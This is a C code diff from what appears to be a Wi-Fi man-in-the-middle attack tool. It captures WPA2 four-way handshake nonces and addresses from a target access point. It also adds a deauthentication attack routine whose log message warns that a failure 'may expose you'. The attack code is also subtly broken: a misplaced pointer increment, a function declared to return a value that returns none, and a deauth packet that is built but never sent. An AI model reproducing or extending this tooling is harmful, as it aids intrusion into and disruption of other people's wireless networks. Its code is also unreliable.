@@ -31,13 +31,15 @@ static int fill_encry_info(struct encrypto_info * info, const struct WPA2_handsh
 	    !(packet->auth_data.key_information & WPA_KEY_INFO_ACK) &&
 	    !(packet->auth_data.key_information & WPA_KEY_INFO_INSTALL)) {
 		memcpy(info->SN, packet->auth_data.Nonce, NONCE_ALEN);	
-		memcpy(info->SA, LOCATE(u8, packet->ieee80211_data, struct ieee80211_hdr_3addr, addr2), ETH_ALEN);
+		memcpy(info->SA, LOCATE(u8, packet->ieee80211_data, 
+					struct ieee80211_hdr_3addr, addr2), ETH_ALEN);
 	}
 	/* frame 3 of 4-way handshake */
 	if ((packet->auth_data.key_information & WPA_KEY_INFO_MIC) &&
 	    (packet->auth_data.key_information & WPA_KEY_INFO_ACK) &&
 	    (packet->auth_data.key_information & WPA_KEY_INFO_INSTALL) &&
-	    !memcmp(info->SA, LOCATE(u8, packet->ieee80211_data, struct ieee80211_hdr_3addr, addr1), ETH_ALEN)) {
+	    !memcmp(info->SA, LOCATE(u8, packet->ieee80211_data, 
+			    struct ieee80211_hdr_3addr, addr1), ETH_ALEN)) {
 		memcpy(info->AN, packet->auth_data.Nonce, NONCE_ALEN);
 	}
 
@@ -120,10 +122,10 @@ void handle_four_way_shakehand(void *ctx, const uint8_t *src_addr, const char *b
 		       	tmp->type = type;	
 			tmp->ieee80211_data = (struct ieee80211_hdr_3addr *)(buf + offset);
 			/* Ignore packet which not came from target access point. */
-			if (memcmp(LOCATE(u8 ,tmp->ieee80211_data, struct ieee80211_hdr_3addr, addr1),
-					MITM->encry_info.AA, ETH_ALEN) &&
-			    memcmp(LOCATE(u8, tmp->ieee80211_data, struct ieee80211_hdr_3addr, addr2),
-				    	MITM->encry_info.AA, ETH_ALEN)) break;
+			if (memcmp(LOCATE(u8 ,tmp->ieee80211_data, struct ieee80211_hdr_3addr, addr1)
+						, MITM->encry_info.AA, ETH_ALEN) &&
+			    memcmp(LOCATE(u8, tmp->ieee80211_data, struct ieee80211_hdr_3addr, addr2)
+				    , MITM->encry_info.AA, ETH_ALEN)) break;
 			offset += sizeof(struct ieee80211_hdr_3addr);
 
 			parse_llc_header(buf, len, &offset, packet);
@@ -162,7 +164,7 @@ void handle_four_way_shakehand(void *ctx, const uint8_t *src_addr, const char *b
 	return;
 }
 
-int prepare_deauth_pkt(u8 *buffer, size_t pkt_len, u8 *victim, u8 *ap, u16 seq_num) {
+static int prepare_deauth_pkt(u8 *buffer, size_t *pkt_len, u8 *victim, u8 *ap, u16 seq_num) {
 	int is_broadcast = 0;
 	if (!buffer || !ap) {
 		log_printf(MSG_WARNING, "[%s]buffer or ap not exist");
@@ -189,8 +191,29 @@ int prepare_deauth_pkt(u8 *buffer, size_t pkt_len, u8 *victim, u8 *ap, u16 seq_n
 	memcpy(deauth.addr3, ap, ETH_ALEN);
 	deauth.seq_ctrl = htons(seq_num);
 
-	pkt_len = radiotap_hdr.it_len + sizeof(deauth);
+	*pkt_len = radiotap_hdr.it_len + sizeof(deauth);
 	memcpy(buffer, &radiotap_hdr, radiotap_hdr.it_len);
 	memcpy(buffer + radiotap_hdr.it_len, &deauth, sizeof(deauth));
-	buffer[pkt_len++] = htons(deauth_unspec_reason);
+	buffer[*pkt_len++] = htons(deauth_unspec_reason);
+}
+
+void deauth_attack(void *eloop_data, void *user_ctx) {
+	struct MITM *MITM = (struct MITM *) user_ctx;
+	u8 *packet;
+	size_t pkt_len;
+	int ret;
+	packet = malloc(MTU);
+	if (!packet)
+		return;
+	/* XXX : I am not really sure how to define the seqence num of packet */
+	ret = prepare_deauth_pkt(packet, &pkt_len, NULL, MITM->encry_info.AA, 9500);
+
+	if (MITM->encry_info.enough) {
+		ret = eloop_cancel_timeout(deauth_attack, NULL, MITM);
+		if (!ret) {
+			log_printf(MSG_WARNING, "[Deauth]unregister deauth attack to"
+					" timeout event failure, it may expose you!");
+		}
+	}
+	free(packet);
 }
